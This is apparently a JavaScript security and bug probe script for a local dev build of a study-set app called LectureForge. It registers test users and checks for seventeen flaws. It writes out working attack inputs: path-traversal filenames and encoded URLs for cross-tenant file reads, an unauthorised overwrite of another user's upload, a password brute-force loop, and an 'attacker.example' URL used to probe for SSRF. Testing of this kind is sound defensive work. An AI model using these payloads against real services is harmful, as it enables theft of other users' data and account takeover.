// Live probes against the LectureForge dev server (local test accounts only).
const BASE = process.env.BASE ?? "http://localhost:3001";
const stamp = Date.now();
const results = [];
const log = (name, pass, detail) => {
  results.push({ name, bug: pass, detail });
  console.log(`${pass ? "BUG CONFIRMED" : "ok / not reproduced"} :: ${name} :: ${detail}`);
};

class Client {
  constructor() { this.jar = new Map(); }
  cookie() { return [...this.jar].map(([k, v]) => `${k}=${v}`).join("; "); }
  store(res) {
    for (const c of res.headers.getSetCookie?.() ?? []) {
      const [kv] = c.split(";");
      const i = kv.indexOf("=");
      this.jar.set(kv.slice(0, i), kv.slice(i + 1));
    }
  }
  async req(path, { method = "GET", json, body, headers = {}, raw = false } = {}) {
    const h = { ...headers, cookie: this.cookie() };
    if (json !== undefined) { h["content-type"] = "application/json"; body = JSON.stringify(json); }
    const res = await fetch(BASE + path, { method, headers: h, body, redirect: "manual" });
    this.store(res);
    if (raw) return res;
    const text = await res.text();
    let data; try { data = JSON.parse(text); } catch { data = text; }
    return { status: res.status, data, headers: res.headers };
  }
  async signIn(email, password) {
    const csrf = await this.req("/api/auth/csrf");
    const form = new URLSearchParams({ csrfToken: csrf.data.csrfToken, email, password, json: "true", callbackUrl: BASE + "/dashboard" });
    await this.req("/api/auth/callback/credentials", { method: "POST", body: form.toString(), headers: { "content-type": "application/x-www-form-urlencoded" } });
    const s = await this.req("/api/auth/session");
    return s.data?.user?.id;
  }
}

async function register(c, tag) {
  const email = `probe-${tag}-${stamp}@example.test`;
  const password = "probe-password-123";
  const r = await c.req("/api/auth/register", { method: "POST", json: { name: `Probe ${tag}`, email, password } });
  if (r.status !== 201) throw new Error(`register ${tag} failed ${r.status} ${JSON.stringify(r.data)}`);
  const id = await c.signIn(email, password);
  if (!id) throw new Error(`sign-in ${tag} failed`);
  return { email, password, id };
}

async function waitJobs(c, setId, ms = 30000) {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    const r = await c.req(`/api/jobs?studySetId=${setId}`);
    const active = (r.data.jobs ?? []).filter((j) => j.status === "QUEUED" || j.status === "RUNNING");
    if (active.length === 0) return r.data.jobs;
    await new Promise((res) => setTimeout(res, 1000));
  }
  return (await c.req(`/api/jobs?studySetId=${setId}`)).data.jobs;
}

const NOTE = `Backpropagation computes gradients of the loss with respect to every weight by applying the chain rule layer by layer.
The learning rate controls the step size of gradient descent. Momentum accumulates an exponentially decaying average of past gradients.
Adam combines momentum with per-parameter adaptive learning rates using first and second moment estimates. Vanishing gradients occur
when repeated multiplication by small derivatives shrinks the signal in deep networks. Batch normalization normalizes activations to stabilize training.
SECRET-OF-USER-A: the exam answer key is 42.`.repeat(3);

async function makeSetWithNote(c, title, outputs = []) {
  const r = await c.req("/api/study-sets", { method: "POST", json: {
    title, subject: "backpropagation gradient descent learning rate", outputTypes: outputs,
    sources: [{ kind: "file", filename: "notes.txt", mimeType: "text/plain", sizeBytes: Buffer.byteLength(NOTE) }],
  } });
  if (r.status !== 201) throw new Error(`create set failed ${r.status} ${JSON.stringify(r.data)}`);
  const set = r.data.studySet;
  const src = r.data.sources[0];
  const u = new URL(src.upload.uploadUrl);
  const put = await c.req(u.pathname + u.search, { method: "PUT", body: NOTE, headers: { "content-type": "text/plain" } });
  if (put.status !== 200) throw new Error(`upload failed ${put.status}`);
  const done = await c.req("/api/uploads/complete", { method: "POST", json: { sourceId: src.id } });
  return { set, sourceId: src.id, key: src.upload.key, complete: done };
}

(async () => {
  const A = new Client(), B = new Client(), anon = new Client();
  const ua = await register(A, "a");
  const ub = await register(B, "b");

  // P1: unauthenticated /create page
  const create = await anon.req("/create", { raw: true });
  log("Unauthenticated access to /create page (middleware matcher omits it)", create.status === 200, `GET /create anon -> ${create.status}`);

  // P2: duplicate-email enumeration
  const dup = await anon.req("/api/auth/register", { method: "POST", json: { name: "x", email: ua.email, password: "whatever-123456" } });
  log("Account enumeration via register", dup.status === 400 && /exists/i.test(JSON.stringify(dup.data)), `${dup.status} ${JSON.stringify(dup.data)}`);

  // P3: concurrent duplicate register -> 500
  const raceEmail = `probe-race-${stamp}@example.test`;
  const race = await Promise.all([1, 2, 3].map(() => anon.req("/api/auth/register", { method: "POST", json: { name: "r", email: raceEmail, password: "race-password-123" } })));
  log("Register race -> unhandled unique violation (500)", race.some((r) => r.status === 500), race.map((r) => r.status).join(","));

  // A's set with a private note
  const a = await makeSetWithNote(A, "Probe A backpropagation", ["GUIDE", "FLASHCARDS"]);
  await waitJobs(A, a.set.id, 60000);
  const aDetail = await A.req(`/api/study-sets/${a.set.id}`);
  const wsA = a.set.workspaceId;

  // P4: uploads/complete double-call -> duplicate ingest jobs
  const again = await A.req("/api/uploads/complete", { method: "POST", json: { sourceId: a.sourceId } });
  await waitJobs(A, a.set.id, 30000);
  const jobsA = (await A.req(`/api/jobs?studySetId=${a.set.id}`)).data.jobs.filter((j) => j.type === "INGEST_SOURCE");
  log("uploads/complete is not idempotent (re-ingests READY source)", again.status === 200 && jobsA.length >= 2, `second call ${again.status}, ingest jobs=${jobsA.length}`);

  // B's own set
  const b = await B.req("/api/study-sets", { method: "POST", json: { title: "Probe B set", sources: [] } });
  const setB = b.data.studySet;

  // P5: cross-tenant read through filename path traversal in storage key
  const travName = `../../../../${wsA}/study-sets/${a.set.id}/sources/${a.sourceId}/notes.txt`;
  const tsrc = await B.req(`/api/study-sets/${setB.id}/sources`, { method: "POST", json: { kind: "file", filename: travName, mimeType: "text/plain", sizeBytes: 10 } });
  let leaked = false, leakDetail = `create source ${tsrc.status}`;
  if (tsrc.status === 201) {
    const comp = await B.req("/api/uploads/complete", { method: "POST", json: { sourceId: tsrc.data.source.id } });
    await waitJobs(B, setB.id, 30000);
    const exp = await B.req("/api/account/export");
    leaked = JSON.stringify(exp.data).includes("SECRET-OF-USER-A");
    leakDetail += `; complete ${comp.status}; B export contains A's secret: ${leaked}`;
  }
  log("Cross-tenant data read via unsanitized upload filename (path traversal in storage key)", leaked, leakDetail);

  // P6: dev upload PUT has no tenant check — B overwrites A's original file
  const put = await B.req(`/api/dev/uploads/${a.key}`, { method: "PUT", body: "OVERWRITTEN BY B", headers: { "content-type": "text/plain" } });
  const aRead = await A.req(`/api/files/${a.key}`);
  log("Cross-tenant overwrite via /api/dev/uploads (no ownership/ticket check)", put.status === 200 && String(aRead.data).includes("OVERWRITTEN BY B"), `B PUT -> ${put.status}; A now reads: ${String(aRead.data).slice(0, 30)}`);

  // P7: /api/files authz on key[1] + traversal
  const trav = await B.req(`/api/files/workspaces/${setB.workspaceId}/..%2F${wsA}/study-sets/${a.set.id}/sources/${a.sourceId}/notes.txt`);
  log("Cross-tenant read via /api/files encoded traversal", trav.status === 200, `status ${trav.status}`);

  // P8: Range edge cases
  const r1 = await A.req(`/api/files/${a.key}`, { headers: { range: "bytes=10-5" } });
  log("Range 'bytes=10-5' (end<start) crashes file route", r1.status >= 500, `status ${r1.status}`);
  const r2 = await A.req(`/api/files/${a.key}`, { headers: { range: "bytes=-5" } });
  log("Suffix range 'bytes=-5' returns head instead of last 5 bytes", r2.status === 206 && !String(r2.headers.get("content-range")).startsWith("bytes 11-"), `content-range ${r2.headers.get("content-range")}`);

  // P9: flashcard edited twice -> unique violation
  const deck = aDetail.data.decks?.[0];
  if (deck) {
    const cards = (await A.req(`/api/decks/${deck.id}`)).data.cards;
    const card = cards[0];
    const e1 = await A.req(`/api/cards/${card.id}`, { method: "PATCH", json: { front: "edit one" } });
    const e2 = await A.req(`/api/cards/${card.id}`, { method: "PATCH", json: { front: "edit two" } });
    log("Second flashcard edit fails (ArtifactEdit version=reps collides)", e2.status >= 500, `edit1 ${e1.status}, edit2 ${e2.status}`);
  } else log("Second flashcard edit fails", false, "no deck auto-generated — skipped");

  // P10: selective section regeneration duplicates the guide
  const guide = (await A.req(`/api/study-sets/${a.set.id}/guide`)).data;
  const g = guide.guides?.[0] ?? guide.guide;
  const sections = g?.sections ?? [];
  if (sections.length) {
    const before = sections.length;
    const rr = await A.req(`/api/study-sets/${a.set.id}/guide/sections/${sections[0].id}`, { method: "POST" });
    await waitJobs(A, a.set.id, 30000);
    const g2 = (await A.req(`/api/study-sets/${a.set.id}/guide`)).data;
    const after = (g2.guides?.[0] ?? g2.guide)?.sections?.length;
    log("Regenerating ONE guide section regenerates and appends the WHOLE outline", after > before, `regen ${rr.status}; sections ${before} -> ${after}`);
  } else log("Selective regeneration", false, `no guide sections (keys: ${Object.keys(guide)})`);

  // P11: quiz generation failure leaves quiz stuck QUEUED
  const q = await B.req(`/api/study-sets/${setB.id}/quiz`, { method: "POST", json: { count: 5 } });
  await waitJobs(B, setB.id, 20000);
  const qs = (await B.req(`/api/study-sets/${setB.id}/quiz`)).data.quizzes;
  const qRow = qs.find((x) => x.id === q.data.quizId);
  const qJob = (await B.req(`/api/jobs?studySetId=${setB.id}`)).data.jobs.find((j) => j.id === q.data.jobId);
  log("Failed quiz generation leaves Quiz.status stuck (never FAILED)", qJob?.status === "FAILED" && qRow?.status !== "FAILED", `job ${qJob?.status}; quiz ${qRow?.status}`);

  // P12: rate-limited generation leaves orphan quiz rows
  let limited = null, n = 0;
  for (; n < 40; n++) {
    const r = await B.req(`/api/study-sets/${setB.id}/quiz`, { method: "POST", json: { count: 3 } });
    if (r.status === 429) { limited = r; break; }
  }
  await waitJobs(B, setB.id, 20000);
  const qsAfter = (await B.req(`/api/study-sets/${setB.id}/quiz`)).data.quizzes;
  const jobsB = (await B.req(`/api/jobs?studySetId=${setB.id}`)).data.jobs;
  log("429 from rate limiter leaves orphan Quiz rows (created before limit check)", limited && qsAfter.length > n + 1 - 0, `429 after ${n} calls; quizzes=${qsAfter.length}, Retry-After=${limited?.headers.get("retry-after")}`);

  // P13: YouTube ingestion in full mock mode
  const yt = await B.req(`/api/study-sets/${setB.id}/sources`, { method: "POST", json: { kind: "youtube", url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ", consent: true } });
  await waitJobs(B, setB.id, 30000);
  const srcs = (await B.req(`/api/study-sets/${setB.id}/sources`)).data.sources;
  const ytSrc = srcs.find((s) => s.id === yt.data.source?.id);
  log("YouTube ingest fails even with TRANSCRIPTION_PROVIDER=mock (message says mock simulates)", ytSrc?.status === "FAILED", `${ytSrc?.status}: ${ytSrc?.error?.slice(0, 120)}`);

  // P14: YouTube URL validation accepts non-YouTube hosts
  const evil = await B.req(`/api/study-sets/${setB.id}/sources`, { method: "POST", json: { kind: "youtube", url: "https://attacker.example/x?youtube.com/watch?v=AAAAAAAAAAA", consent: true } });
  log("Non-YouTube URL accepted as YouTube source (passed to yt-dlp => SSRF)", evil.status === 201, `status ${evil.status}`);

  // P15: Unsupported mime partial-creation (study set created even though 2nd source invalid)
  const before = (await B.req("/api/study-sets")).data.length;
  const partial = await B.req("/api/study-sets", { method: "POST", json: { title: "Partial probe", sources: [
    { kind: "file", filename: "ok.txt", mimeType: "text/plain", sizeBytes: 10 },
    { kind: "file", filename: "bad.exe", mimeType: "application/x-msdownload", sizeBytes: 10 } ] } });
  const after = (await B.req("/api/study-sets")).data.length;
  log("Study-set create not atomic: 400 response but orphan set+source persisted", partial.status === 400 && after > before, `status ${partial.status}; sets ${before} -> ${after}`);

  // P16: password reset is a stub
  const reset = await anon.req("/api/auth/reset", { method: "POST", json: { email: ua.email } });
  log("Password reset does nothing (no token/email flow)", reset.data?.delivery === "unconfigured", JSON.stringify(reset.data));

  // P17: brute-force — no lockout on credentials sign-in
  const bf = new Client(); let okCount = 0;
  for (let i = 0; i < 15; i++) { const id = await bf.signIn(ua.email, "wrong-" + i); if (!id) okCount++; }
  const finalId = await bf.signIn(ua.email, ua.password);
  log("No brute-force throttling on sign-in", Boolean(finalId), `15 wrong attempts then correct password accepted: ${Boolean(finalId)}`);

  console.log("\nJSON_RESULTS " + JSON.stringify({ users: [ua.email, ub.email], sets: [a.set.id, setB.id], results }));
})().catch((e) => { console.error("PROBE CRASH", e); process.exit(1); });
